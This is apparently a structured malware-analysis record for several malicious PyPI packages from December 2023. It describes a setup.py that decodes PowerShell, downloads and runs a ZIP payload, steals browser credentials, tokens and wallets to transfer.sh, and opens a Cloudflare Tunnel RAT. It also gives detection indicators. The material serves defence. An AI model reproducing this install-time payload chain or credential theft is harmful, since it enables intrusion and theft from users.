package_info.package_name: pyrologin, easytimestamp, discorder, discord-dev, style.py, pythonstyles
package_info.package_versions: all versions published between Dec 22 and Dec 31 (2023)
package_info.why_malicious: These packages install information-stealing and remote access trojan (RAT) malware, exfiltrate sensitive data, establish persistence, and enable remote control via Cloudflare Tunnel, bypassing firewalls and security controls.

malicious_snippets.code_snippet: base64.b64decode('...') # decodes to a PowerShell script that downloads and executes a ZIP payload
malicious_snippets.code_behavior: During installation, the code decodes and executes a PowerShell script that downloads a ZIP file from a remote server, extracts it to a temp directory, and installs additional dependencies for remote control and info-stealing.

malice_analysis.why_suspicious: Decoding and executing a PowerShell script from setup.py is highly unusual and enables arbitrary code execution.
malice_analysis.violated_expectations: setup.py should only handle package installation, not download and execute remote payloads.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies, but not arbitrary remote executables.

malicious_snippets.code_snippet: Invoke-WebRequest -Uri <remote_zip_url> -OutFile <temp_zip_path>; Expand-Archive <temp_zip_path> <temp_dir>; pip install flask flask_cloudflared
malicious_snippets.code_behavior: After installation, the script downloads a ZIP archive from a remote server, extracts it, and installs additional Python packages to enable remote access and tunneling.

malice_analysis.why_suspicious: Downloading and executing remote archives is a common malware delivery technique.
malice_analysis.violated_expectations: Installers should not fetch and execute arbitrary remote code.
malice_analysis.similar_legitimate_use: Automated installers may fetch dependencies, but not arbitrary archives.
key_indicators: PowerShell used for persistence and stealth

malicious_snippets.code_behavior: At runtime, the code collects browser cookies, passwords, tokens, and wallet data, zips the data, uploads it to transfer.sh, and pings a C2 onion site to confirm exfiltration.

malice_analysis.why_suspicious: Harvesting sensitive data and exfiltrating it to remote servers is classic info-stealer behavior.
malice_analysis.violated_expectations: Legitimate packages should not access or transmit user secrets.
malice_analysis.similar_legitimate_use: Security audit tools may access such data with explicit user consent.

malicious_snippets.code_behavior: At runtime, the code launches threads to establish persistence, ping a C2 onion site, start a keylogger, and steal/exfiltrate data.

malice_analysis.why_suspicious: Simultaneous persistence, keylogging, and C2 communication are hallmarks of advanced malware.
malice_analysis.violated_expectations: Normal packages do not establish persistence or run keyloggers.

malicious_snippets.code_snippet: install_cloudflared_tunnel() # Installs and runs Cloudflare Tunnel client
malicious_snippets.code_behavior: At runtime, the code installs and runs a Cloudflare Tunnel client, creating a bidirectional tunnel for remote access to the infected machine.

malice_analysis.why_suspicious: Cloudflare Tunnel is used to bypass firewalls and expose internal services to the internet.
malice_analysis.violated_expectations: Legitimate packages do not expose local machines to the internet without user consent.
malice_analysis.similar_legitimate_use: DevOps may use tunnels for legitimate remote access, but not in user-facing packages.

malicious_snippets.code_behavior: At runtime, the Flask app exposes endpoints for remote shell command execution, file exfiltration, Python code execution, and live desktop streaming.

malice_analysis.why_suspicious: Remote shell, file exfiltration, and live desktop feed are classic RAT features.
malice_analysis.violated_expectations: Legitimate Flask apps do not provide unrestricted remote control.

attack_chain.action: User installs malicious PyPI package, triggering setup.py.
attack_chain.leads_to: PowerShell script execution and payload download

attack_chain.action: PowerShell script downloads ZIP payload, extracts files, and installs dependencies.
server.pyw runs, launching threads for persistence, keylogging, C2 ping, and data theft.
Stolen data is zipped and exfiltrated to transfer.sh; C2 onion site is pinged.
Cloudflare Tunnel client is installed and started, exposing RAT server.
Flask-based RAT server provides remote shell, file exfiltration, and live desktop feed.
attack_chain.leads_to: Full remote control and ongoing data theft

behavioral_signatures: setup.py decoding and executing base64-encoded PowerShell scripts
PowerShell scripts downloading and extracting remote ZIP payloads
Silent installation of additional Python packages (flask, flask_cloudflared)
Multi-threaded persistence, keylogging, and C2 communication
Cloudflare Tunnel client installation and execution
Flask apps exposing remote shell and desktop feed endpoints
file_indicators: Extracted files: server.pyw, cftunnel.py, xrat Flask app
Presence of \firsrun.txt, \saved, and zipped data in temp directories
network_indicators: Outbound connections to transfer.sh for data exfiltration
HTTP(S) requests to onion C2 sites (e.g., *.onion.pet)
detection_knowledge.how_to_detect: Monitor for setup.py scripts that decode and execute PowerShell or download remote archives. Flag unexpected installation of flask or flask_cloudflared as dependencies. Detect outbound connections to transfer.sh and onion domains. Look for cloudflared tunnel processes and Flask servers exposing remote shell or desktop endpoints. Alert on multi-threaded persistence, keylogging, and data exfiltration behaviors.
